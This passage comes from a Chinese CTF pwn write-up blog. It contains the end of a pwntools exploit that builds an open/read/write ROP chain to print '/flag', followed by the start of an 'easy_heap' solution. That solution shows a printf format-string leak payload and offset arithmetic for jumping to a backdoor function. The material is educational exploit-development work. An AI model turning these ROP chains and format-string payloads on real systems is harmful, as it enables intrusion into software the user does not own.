class=&#34;line&#34;&gt;readone(&lt;span class=&#34;number&#34;&gt;270&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;The num: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mainlow = io.recv(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readone(&lt;span class=&#34;number&#34;&gt;271&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;The num: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mainhigh = io.recv(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(mainhigh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi = libcbase + &lt;span class=&#34;number&#34;&gt;0x002164f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop2 = libcbase+&lt;span class=&#34;number&#34;&gt;0x022394&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rsi = libcbase +&lt;span class=&#34;number&#34;&gt;0x0000023a6a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdx = libcbase + &lt;span class=&#34;number&#34;&gt;0x001b96&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;,pop_rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#writeone(263,mainhigh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libcbase +&lt;span class=&#34;number&#34;&gt;0x001b3d88&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#binsh  = libcbase + mylibc.search(b&amp;quot;/bin/sh&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;264&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;265&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;266&lt;/span&gt;,pop_rsi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;267&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;268&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mainlow)+&lt;span class=&#34;number&#34;&gt;0x202100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;269&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mainhigh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;270&lt;/span&gt;,pop_rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;271&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;272&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;273&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read = libcbase + mylibc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;read&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;274&lt;/span&gt;,read)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;275&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# open&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;276&lt;/span&gt;,pop_rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;277&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;278&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mainlow)+&lt;span class=&#34;number&#34;&gt;0x202100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;279&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mainhigh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;289&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# read&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;290&lt;/span&gt;,pop_rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;291&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;292&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;293&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;294&lt;/span&gt;,pop_rsi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;295&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;296&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mainlow)+&lt;span class=&#34;number&#34;&gt;0x202100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;297&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mainhigh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;298&lt;/span&gt;,pop_rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;299&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;300&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;301&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;302&lt;/span&gt;,read)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;303&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#system = libcbase + 0x14b88&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# write&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;304&lt;/span&gt;,pop_rdi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;305&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;306&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;307&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;308&lt;/span&gt;,pop_rsi)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;309&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;310&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mainlow)+&lt;span class=&#34;number&#34;&gt;0x202100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;311&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mainhigh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;312&lt;/span&gt;,pop_rdx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;313&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;314&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;315&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write1 = libcbase + mylibc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;316&lt;/span&gt;,write1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writeone(&lt;span class=&#34;number&#34;&gt;317&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;/flag\x00&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(io.recv(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;2-easy-heap&#34;&gt;&lt;a href=&#34;#2-easy-heap&#34; class=&#34;headerlink&#34; title=&#34;2. easy_heap&#34;&gt;&lt;/a&gt;2. easy_heap&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blingblingxuanxuan.github.io/2020/03/01/hacknote/&#34;&gt;https://blingblingxuanxuan.github.io/2020/03/01/hacknote/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		刚拿到这道题的时候就发现特别熟悉…想了下是道原题(hacknote),不过进行了点小的修改.&lt;/p&gt;
&lt;p&gt;​		给自己的提醒是做题或者以后的实战中,要有一个清晰的思路,不是想到什么干什么,而是先从最简单的最好用的开始,比如这道题,其实有后门函数可以直接利用,但自己一开始想到的就是构造rop链(不过为什么没成功呢???后面分析)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523154826731.png&#34; alt=&#34;image-20230523154826731&#34;&gt;get_library_name 中有格式化字符串&lt;/p&gt;
&lt;h2 id=&#34;泄露程序加载地址&#34;&gt;&lt;a href=&#34;#泄露程序加载地址&#34; class=&#34;headerlink&#34; title=&#34;泄露程序加载地址&#34;&gt;&lt;/a&gt;泄露程序加载地址&lt;/h2&gt;&lt;p&gt;​		前面多加了这个函数,有格式化字符串漏洞,可以利用这个泄露栈上的地址&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_library_name&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; format; &lt;span class=&#34;comment&#34;&gt;// [esp+Ch] [ebp-2Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [esp+2Ch] [ebp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;please input the library name:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%32s&amp;quot;&lt;/span&gt;, &amp;amp;format);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&amp;amp;format);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&amp;amp;byte_1198);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readgsdword(&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;u) ^ v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		第19个位置是main+89&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523155647057.png&#34; alt=&#34;image-20230523155647057&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;%x.%x.aaa%19$d.%x.%x.%x&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;aaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recv(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)) - &lt;span class=&#34;number&#34;&gt;0x208&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		-0x208 &amp;#x3D;  - 0x100e + 0xe06 &lt;/p&gt;
&lt;p&gt;​		-0x100e是main+89距离文件起始处的位置, 0xe06是magic后门函数的偏移&lt;/p&gt;
&lt;h2 id=&#34;exp-1&#34;&gt;&lt;a href=&#34;#exp-1&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;​		同样还是hacknote的堆处理方法,把函数地址替换成magic就可以了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;i386&amp;#x27;&lt;/span&gt;,os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mylibc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./easy_heap&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span 